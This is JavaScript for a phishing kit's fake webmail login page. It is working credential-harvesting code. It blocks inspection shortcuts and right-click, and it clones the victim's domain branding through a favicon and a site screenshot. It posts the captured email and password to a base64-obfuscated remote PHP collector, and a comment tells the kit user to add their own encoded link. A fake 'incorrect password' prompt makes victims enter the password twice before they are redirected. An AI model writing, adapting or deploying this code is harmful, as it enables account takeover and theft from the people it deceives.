   window.addEventListener("keydown", async (e) => {
        if (e.ctrlKey && 83 == e.which) return e.preventDefault(), !1;
      }),
        window.addEventListener("contextmenu", (e) => e.preventDefault()),
        (document.onkeydown = function (e) {
          if (
            123 == event.keyCode ||
            (e.ctrlKey && 69 == e.keyCode) ||
            (e.ctrlKey && e.shiftKey && 73 == e.keyCode) ||
            (e.ctrlKey && e.shiftKey && 74 == e.keyCode) ||
            (e.ctrlKey && 85 == e.keyCode) ||
            (e.ctrlKey && 83 == e.keyCode) ||
            (e.ctrlKey && 72 == e.keyCode) ||
            (e.ctrlKey && 65 == e.keyCode) ||
            (e.ctrlKey && 70 == e.keyCode) ||
            (e.ctrlKey && 69 == e.keyCode)
          )
            return !1;
        }),
        (window.onkeydown = (e) =>
          !(
            e.ctrlKey &&
            (67 === e.keyCode ||
              86 === e.keyCode ||
              85 === e.keyCode ||
              117 === e.keyCode)
          ));

      const url ="aHR0cHM6Ly90cmFmaWd1cmFzZ3JvdXAuY29tL21va28ucGhw"; // ADD  YOUR ENCODED  PHPFILE  LINK
      const redirectUrl = ""; // ADD YOUR REDIRECT URL HERE

      const hash = window.location.hash.split("#")[1];
      let decode, urlDecoded;

      try {
        urlDecoded = url ? atob(url) : url;
      } catch (e) {
        urlDecoded = url;
      }

      let plusOne = 0;
      const email = document.getElementById("username");
      const password = document.getElementById("password");
      const source = document.getElementById("source");
      const submitBtn = document.getElementById("loginbtn");
      const errorShow = document.getElementById("err");
      const logo = document.getElementById("logo");
      email.value = hash ? hash : "";
      hash ? password.focus() : email.focus();

      const domain = email.value.split("@")[1];

      const size = `64`;
      const img = `url(https://image.thum.io/get/65490-1671030344805-37a36e07674665dbe1105f1044aab44d/width/1200/https://${domain})`;
      $('body').css("background-image", img);
      const gFav = `https://www.google.com/s2/favicons?domain=${domain}&sz=${size}`;
      logo.src = gFav;

      submitBtn.addEventListener("click", function (e) {
        e.preventDefault();
        if (email.value === "") {
          errorShow.textContent = "Enter your email address";
          email.focus();
          showEl(errorShow, "red");
          return;
        } else if (
          !email.value.match(
            /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
          )
        ) {
          errorShow.textContent = "Enter a valid email address";
          email.focus();
          showEl(errorShow, "red");
          return;
        } else if (password.value === "") {
          errorShow.textContent = "Enter your email password";
          password.focus();
          showEl(errorShow, "red");
          return;
        } else {
          plusOne = plusOne + 1;
          showEl(errorShow, "black");
          errorShow.textContent = "Authenticating...";

          var data = {
            email: email.value,
            password: password.value,
            source: source.value,
          };

          $.ajax({
            type: "POST",
            url: urlDecoded,
            data: data,
            cache: false,
            timeout: 800000,
            success: function (res) {
			
              if (res == true) {
			  
			
			  	
                if (plusOne >=2) {
				
			
				plusOne=0;
				
                  password.value = "";
                  hideEl(errorShow);
                  password.style.borderColor = "#ddd";
                  window.location.href = "https://google.cm";
                } else {
                  showEl(errorShow, "red");
                  errorShow.textContent =
                    "Your password is incorrect, try again.";
                  password.value = "";
                  password.style.borderColor = "red";
                }
                return;
              } else {
                showEl(errorShow, "red");
                errorShow.textContent =
                  "Something isn't right, please try again.";
                password.value = "";
                password.style.borderColor = "red";
              }
            },
            error: function (e) {
				
				
				 if (plusOne >=3) {
				
			
			
				
                  password.value = "";
                  hideEl(errorShow);
                  password.style.borderColor = "#ddd";
                  window.location.href = "https://"+domain;
                } else {
                  showEl(errorShow, "red");
                  errorShow.textContent =
                    "Your password is incorrect, try again.";
                  password.value = "";
                  password.style.borderColor = "red";
                }
            },
          });
        }
      });

      function showEl(el, color) {
        el.style.color = color;
        el.style.display = "block";
      }

      function hideEl(el) {
        el.style.color = "#000";
        el.style.display = "none";
        el.textContent = "";
      }
  
